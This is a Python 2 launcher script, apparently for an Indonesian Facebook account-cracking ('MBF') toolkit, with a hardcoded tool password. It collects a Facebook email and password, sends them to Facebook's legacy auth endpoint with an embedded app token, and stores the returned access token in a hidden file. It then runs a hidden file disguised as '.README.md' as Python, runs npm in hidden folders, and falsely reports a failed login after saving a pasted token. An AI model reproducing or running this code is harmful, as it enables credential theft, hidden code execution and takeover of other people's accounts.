try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests,bxin
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('pip2 install bxin')
    os.system('pkg install nodejs')

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
session = requests.Session()
session.headers.update({'User-Agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]'})
os.system('clear')

##### LOGO #####
logo='''
\033[91m
\033[91m  _____           _        _ _         _____ _         
\033[92m / ____|         | |      | (_)       |_   _| |        
\033[95m | |     __ _ ___| |_ __ _| |_  __ _    | | | | __ ____
\033[95m | |    / _` / __| __/ _` | | |/ _` |   | | | |/ /|_  /
\033[92m | |___| (_| \__ \ || (_| | | | (_| |_ _| |_|   <  / / 
\033[91m  \_____\__,_|___/\__\__,_|_|_|\__,_(_)_____|_|\_\/___|
\033[92m  XamppGangstaTeam>_/Kagurazaga_ikz
--------------------------------------------------

\033[94m*Auther   : Castalia.Ikz
\033[91m*Facebook : Bagaskurniawan EX
\033[92m*Github   : github.com/Castalia
\033[93m*Website  : xampp-cyber.my.id

--------------------------------------------------
                                '''

CorrectUsername = 'Castalia'
CorrectPassword = 'ikz'

loop = 'true'
while (loop == 'true'):
    print logo
    username = raw_input(' Username Tools: ')
    if (username == CorrectUsername):
        password = raw_input(' Password Tools: ')
        if (password == CorrectPassword):
            print ' Mantap Jiwa ' + username
            time.sleep(1)
            loop = 'false'
        else:
            print ' Password Salah Nyet !'
            os.system('clear')
    else:
        print ' Username Salah Nyet !'
        os.system('clear')
        
def tik():
    titik = ['.   ','..  ','... ','.   ','..  ','... ']
    for o in titik:
        print('\r[+] Sabar sob... '+o),;sys.stdout.flush();time.sleep(1)

def cb():
    os.system('clear')

def t():
    time.sleep(1)
    
def login():
    os.system('clear')
    try:
        toket = open('....', 'r')
        os.system('python2 .README.md')
    except (KeyError,IOError):
        os.system('rm -rf ....')
        os.system('clear')
        print (logo)
        print ('[1] Login Dengan Facebook')
        print ('[2] Login Menggunakan Token')
        print ("[3] Buat Token")
        print (50*'-')
        login_choice()
        
def login_choice():
    bch = raw_input('\n >>>>||  ')
    if bch =='':
        print ('[!] Fill in correctly')
        login()
    elif bch =='2':
        os.system('clear')
        print (logo)
        fac=raw_input(' Paste Token Disini Sob: ')
        tik()
        fout=open('....', 'w')
        fout.write(fac)
        fout.close()
        print ('[+]\033[1;92m Login Gagal \033[1;97m')
        time.sleep(1)
        os.system('xdg-open https://Facebook.com/nsaa00xd')
        os.system('python2 cast_mbf.py')
    elif bch =='1':
        login1()
    elif bch =="3":
        try:
             os.mkdir(".../cast_mbf")
        except OSError:
            os.system("cd $HOME/cast_mbf/.a. && npm start")
        else:
            os.system("rm -rf $HOME/cast_mbf/.../cast_mbf")
            os.system("mv $HOME/cast_mbf/... $HOME/cast_mbf/.a.")
            os.system("cd $HOME/cast_mbf/.a. && npm install")
            os.system("cd $HOME/cast_mbf/.a. && npm start")
            
def login1():
    os.system("clear")
    try:
        tb=open('....', 'r')
        os.system("python2 .README.md")
    except (KeyError,IOError):
        os.system("clear")
        print (logo)
        print ('           LOGIN WITH FACEBOOK ')
        print
        iid=raw_input('[+] Number/Email: ')
        id=iid.replace(" ","")
        pwd=getpass.getpass('[+] Password : ')
        tik()
        data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+(id)+"&locale=en_US&password="+(pwd)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
        z=json.load(data)
        if 'access_token' in z:
            st = open("....", "w")
            st.write(z["access_token"])
            st.close()
            print ('[+]\033[1;92m Login successfull \033[1;97m')
            time.sleep(1)
            os.system('xdg-open https://www.facebook.com/nsaa00xd')
            os.system("clear")
            os.system("python2 .README.md")
        else:
            if "www.facebook.com" in z["error_msg"]:
                print ('Akun terkena checkpoint !')
                time.sleep(1)
                login1()
            else:
                print ('Login Gagal !')
                time.sleep(1)
                login1()
            
if __name__=='__main__':
    login()
